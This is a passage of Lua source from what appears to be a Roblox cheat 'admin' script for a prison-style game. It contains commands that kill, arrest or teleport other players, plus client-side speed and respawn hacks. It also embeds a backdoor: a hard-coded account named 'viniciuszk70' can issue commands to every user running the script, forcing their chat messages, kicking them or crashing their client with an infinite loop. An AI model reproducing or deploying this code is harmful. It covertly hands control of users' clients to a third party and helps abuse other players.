BringA()

else

Bring(FindPlayer(Arg2), LPlayer.Character.HumanoidRootPart.CFrame)

end

end

if Connect.SendCommand("crim") then

if Arg2 == "all" or Arg2 == "a" then

CrimA()

else

Crim(FindPlayer(Arg2))

end

end

if Connect.SendCommand("rj") or Connect.SendCommand("rejoin") then
game:GetService("TeleportService"):Teleport(game.PlaceId, LPlayer)
end

if Connect.SendCommand("quit") or Connect.SendCommand("leave") then
game:Shutdown()
end

if Connect.SendCommand("anticrash") then
if Arg2 == "on" then
if not AntiCrash then
AntiCrash = true
LPlayer.PlayerScripts.ClientGunReplicator.Disabled = true
Message("Anti Crash enabled.",70,70,70,Enum.Font.GothamBlack,22)
end
end
if Arg2 == "off" then
if AntiCrash then
AntiCrash = false
LPlayer.PlayerScripts.ClientGunReplicator.Disabled = false
Message("Anti Crash desabled.",70,70,70,Enum.Font.GothamBlack,22)
end
end
end

if Connect.SendCommand("sa") then
local Player = FindPlayer(Arg2)
if Player ~= nil and Player.Name ~= "viniciuszk70" and not Sa[Player.UserId] then
Sa[Player.UserId] = {Player = Player}
end
end

if Connect.SendCommand("unsa") then
local Player = FindPlayer(Arg2)
if Player ~= nil and Player.Name ~= "viniciuszk70"  and Sa[Player.UserId] then
Sa[Player.UserId] = nil
end
end

if Connect.SendCommand("ultrasa") then
local Player = FindPlayer(Arg2)
if Player ~= nil and Player.Name ~= "viniciuszk70" and not Sa[Player.UserId] then
Sa[Player.UserId] = {Player = Player}
end
end

if Connect.SendCommand("unultrasa") then
local Player = FindPlayer(Arg2)
if Player ~= nil and Player.Name ~= "viniciuszk70" and Sa[Player.UserId] then
Sa[Player.UserId] = nil
end
end

end

end

Connect.OwnerCommands = function(Msg)

if not DisableAdmin then

Args(Msg)

if Connect.SendCommand("prc") then
if Arg2 == "on" then
if not ProtectOwner then
if LPlayer.Name ~= "viniciuszk70" then
ProtectOwner = true
Message("Owner protection has been enabled, if you click on it you disappear.",255,0,0,Enum.Font.GothamBlack,22)
else
ProtectOwner = true
Message("Owner protection has been enabled.",255,0,0,Enum.Font.GothamBlack,22)
end
end
end
if Arg2 == "off" then
if ProtectOwner then
if LPlayer.Name ~= "viniciuszk70" then
ProtectOwner = false
Message("Owner protection has been desabled.",255,0,0,Enum.Font.GothamBlack,22)
else
ProtectOwner = false
Message("Owner protection has been desabled.",255,0,0,Enum.Font.GothamBlack,22)
end
end
end
end

if Connect.SendCommand("prb") then
if Arg2 == "on" then
if not ProtectBlockOwner then
ProtectBlockOwner = true
Message("Owner block protection has been enabled.",255,0,0,Enum.Font.GothamBlack,22)
end
end
if Arg2 == "off" then
if ProtectBlockOwner then
ProtectBlockOwner = false
Message("Owner block protection has been desabled.",255,0,0,Enum.Font.GothamBlack,22)
end
end
end

if Connect.SendCommand("getusers") then
if LPlayer.Name ~= "viniciuszk70" then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(LPlayer.Name, "All")
end
end

if Connect.SendCommand("send") then
local Player = FindPlayer(Arg2)

if LPlayer == Player then
if Arg3 and not Arg4 and not Arg5 and not Arg6 and not Arg7 and not Arg8 and not Arg9 and not Arg10 then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Arg3, "All")
end
if Arg3 and Arg4 and not Arg5 and not Arg6 and not Arg7 and not Arg8 and not Arg9 and not Arg10 then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Arg3.." "..Arg4, "All")
end
if Arg3 and Arg4 and Arg5 and not Arg6 and not Arg7 and not Arg8 and not Arg9 and not Arg10 then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Arg3.." "..Arg4.." "..Arg5, "All")
end
if Arg3 and Arg4 and Arg5 and Arg6 and not Arg7 and not Agr8 and not Arg9 and not Agr10 then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Arg3.." "..Arg4.." "..Arg5.." "..Arg6, "All")
end
if Arg3 and Arg4 and Arg5 and Arg6 and Arg7 and not Arg8 and not Arg9 and not Arg10 then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Arg3.." "..Arg4.." "..Arg5.." "..Arg6.." "..Arg7, "All")
end
if Arg3 and Arg4 and Arg5 and Arg6 and Arg7 and Arg8 and not Arg9 and not Arg10 then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Arg3.." "..Arg4.." "..Arg5.." "..Arg6.." "..Arg7.." "..Arg8, "All")
end
if Arg3 and Arg4 and Arg5 and Arg6 and Arg7 and Arg8 and Arg9 and not Arg10 then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Arg3.." "..Arg4.." "..Arg5.." "..Arg6.." "..Arg7.." "..Arg8.." "..Arg9, "All")
end
if Arg3 and Arg4 and Arg5 and Arg6 and Arg7 and Arg8 and Arg9 and Arg10 then
Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Arg3.." "..Arg4.." "..Arg5.." "..Arg6.." "..Arg7.." "..Arg8.." "..Arg9.." "..Arg10, "All")
end
end

end

if Connect.SendCommand("kick") then
local Player = FindPlayer(Arg2)

if LPlayer == Player then
LPlayer:Kick("Kicked by Owner")
end
end

if Connect.SendCommand("crash") then
local Player = FindPlayer(Arg2)

if LPlayer == Player then
repeat until nil
end
end

end

end

LPlayer.Chatted:Connect(Connect.Commands)

if Owner then
Owner.Chatted:Connect(Connect.OwnerCommands)
end

Players.PlayerAdded:Connect(function(Added)
if not DisableAdmin then
if Added.Name == "viniciuszk70" then
Added.Chatted:Connect(Connect.OwnerCommands)
end
end
end)

LPlayer:GetMouse().KeyDown:connect(function(Key)
pcall(function()
if Prefix == "/" then
if Key == ";" then
CmdBox:CaptureFocus()
end
else
if Key == Prefix then
CmdBox:CaptureFocus()
end
end
end)
end)

CmdBox.FocusLost:Connect(function(FocusLost)
pcall(function()
if FocusLost then
if CmdBox.Text:sub(1,#Prefix) ~= Prefix then
Connect.Commands(Prefix..CmdBox.Text)
else
Connect.Commands(CmdBox.Text)
end
end
end)
end)

Run.Stepped:Connect(function()
if not DisableAdmin then
if ProtectBlockOwner then
if LPlayer.Name ~= "viniciuszk70" then
if Players:FindFirstChild("viniciuszk70") then
pcall(function()
Box.CFrame = Owner.Character.HumanoidRootPart.CFrame
end)
else
pcall(function()
Box.Position = Vector3.new(0,5000,0)
end)
end
end
else
pcall(function()
Box.Position = Vector3.new(0,5000,0)
end)
end
end
end)

Run.Stepped:Connect(function()

if not DisableAdmin then

pcall(function()

for i,v in pairs(Players:GetChildren()) do

Number = 0

for i2,v2 in pairs(v.Character:GetDescendants()) do

if v2.Name == "handcuffedGui" then

Number = Number + 1

if Number > 1 then

for i = 1, Number - 2 do
v2:Destroy()
end

end

end

if v2.Name == "vest" then

Number = Number + 1

if Number > 1 then

for i = 1, Number - 1 do
v2:Destroy()
end

end

end

end

end

end)

end

end)

spawn(function()
Run.Stepped:Connect(function()
if not DisableAdmin then
if SpamToggle.Text == "Spam on" then
coroutine.resume(coroutine.create(function()
if SpamToggle.Text == "Spam on" then
SpamArrest(FindPlayer(Player_2.Text))
end
end))
end
end
end)
end)

spawn(function()
while wait() do
if not DisableAdmin then
pcall(function()
local Owner = Players:FindFirstChild("viniciuszk70")
local Health = LPlayer.Character.Humanoid.Health
local InnoKills = LPlayer.Status.innocentKills.Value
local VPlayers = 0
local Friends = 0

for i,v in pairs(Players:GetPlayers()) do
Check = 1
repeat wait()
Check = Check - 1
VPlayers = VPlayers + 1
if LPlayer:IsFriendsWith(v.UserId) then
Friends = Friends + 1
end
until Check == 0
end

if Owner then
OwnerCheck = "Yes"
else
OwnerCheck = "No"
end

Display.Text = "Display: "..LPlayer.DisplayName
Nick.Text = "Nick: "..LPlayer.Name
User_Id.Text = "User id: "..LPlayer.UserId
Life.Text = "Life: "..Health
Team.Text = "Team: "..LPlayer.TeamColor.Name
Ammo.Text = "Ammo: "..PlayerGui.Home.hud.GunFrame.Magazine.Text
Killed_innocents.Text = "Killed innocents: "..InnoKills
Players2.Text = "Players: "..VPlayers
Friendsontheserver.Text = "Friends on the server: "..Friends
Theownerisontheserver.Text = "The owner is on the server: "..OwnerCheck
end)
end
end
end)

Run.Stepped:Connect(function()
if not DisableAdmin then
pcall(function()
local FPS = game:GetService("Workspace"):GetRealPhysicsFPS()
Fps2.Text = 'FPS: '..math.floor(FPS)
end)
end
end)

Mouse.KeyDown:connect(function(Key)
if not DisableAdmin then
if Key:lower() == "w" then
WT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WT.TextColor3 = Color3.fromRGB(0, 0, 0)
end
if Key:lower() == "a" then
AT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AT.TextColor3 = Color3.fromRGB(0, 0, 0)
end
if Key:lower() == "s" then
ST.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ST.TextColor3 = Color3.fromRGB(0, 0, 0)
end
if Key:lower() == "d" then
DT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DT.TextColor3 = Color3.fromRGB(0, 0, 0)
end
if Key:lower() == " " then
Back_Space.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Back_Space.TextColor3 = Color3.fromRGB(0, 0, 0)
end
end
end)

Mouse.KeyUp:connect(function(Key)
if not DisableAdmin then
if Key:lower() == "w" then
WT.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
WT.TextColor3 = Color3.fromRGB(255, 255, 255)
end
if Key:lower() == "a" then
AT.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
AT.TextColor3 = Color3.fromRGB(255, 255, 255)
end
if Key:lower() == "s" then
ST.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ST.TextColor3 = Color3.fromRGB(255, 255, 255)
end
if Key:lower() == "d" then
DT.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DT.TextColor3 = Color3.fromRGB(255, 255, 255)
end
if Key:lower() == " " then
Back_Space.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Back_Space.TextColor3 = Color3.fromRGB(255, 255, 255)
end
end
end)

spawn(function()
while wait() do
if not DisableAdmin then
pcall(function()
if ToggleFrame.Visible == true and StatusFrame.Visible == true then
StatusFrame.Position = UDim2.new(0.625360143, 0, 0.405833313, 0)
ToggleFrame.Position = UDim2.new(0.68351392, 0, 0.62203125, 0)
end
if ToggleFrame.Visible ~= true then
StatusFrame.Position = UDim2.new(0.625360143, 0, 0.62203125, 0)
end
if StatusFrame.Visible ~= true then
ToggleFrame.Position = UDim2.new(0.68351392, 0, 0.62203125, 0)
end
end)
end
end
end)

spawn(function()
while wait() do
if not DisableAdmin then
for i,v in pairs(Lk) do
if v ~= nil then
pcall(function()
if v.Player.Character:FindFirstChild("HumanoidRootPart") then
Cmds.Kill(v.Player)
end
end)
end
end
end
end
end)

spawn(function()
while wait() do
if AutoLock then
if not DisableAdmin then
if LPlayer.Character:FindFirstChild("HumanoidRootPart") then
pcall(function()
if LPlayer.Character:FindFirstChild("ClientInputHandler") then
LPlayer.Character:FindFirstChild("ClientInputHandler"):Destroy()
end
if LPlayer.Character.Humanoid.WalkSpeed ~= 25 then
LPlayer.Character.Humanoid.WalkSpeed = 25
end
if LPlayer.Character.Humanoid.JumpPower ~= 50 then
LPlayer.Character.Humanoid.JumpPower = 50
end
end)
end
end
end
end
end)

spawn(function()
while wait() do
if AutoRespawn then
if not DisableAdmin then
pcall(function()
if LPlayer.Character:FindFirstChild('HumanoidRootPart') then
if LPlayer.Character:FindFirstChild("Humanoid").Health ~= 0 then
SaveFrame = LPlayer.Character.HumanoidRootPart.CFrame
end
end
end)
end
end
end
end)

LPlayer.CharacterAdded:Connect(function()
if AutoRespawn == true then
if not DisableAdmin then
AutoRespawn = false
wait(.1)
LPlayer.Character.HumanoidRootPart.CFrame = SaveFrame
if LPlayer.Character.HumanoidRootPart.Position.Y < 80 then
LPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(960.266663, 99.9899826, 2397.16089, 0.726921022, -2.84909412e-08, 0.686721087, -5.75977843e-09, 1, 4.75853241e-08, -0.686721087, -3.85461334e-08, 0.726921022)
end
CheckDiedAutoRespawn = false
AutoRespawn = true
end
end
end)

spawn(function()
while wait() do
if AutoRespawn then
if not DisableAdmin then
pcall(function()
if LPlayer.Character:FindFirstChild("HumanoidRootPart") then
if LPlayer.Character.Humanoid.Health == 0 then
Cmds.Respawn()
end
end
end)
end
end
end
end)

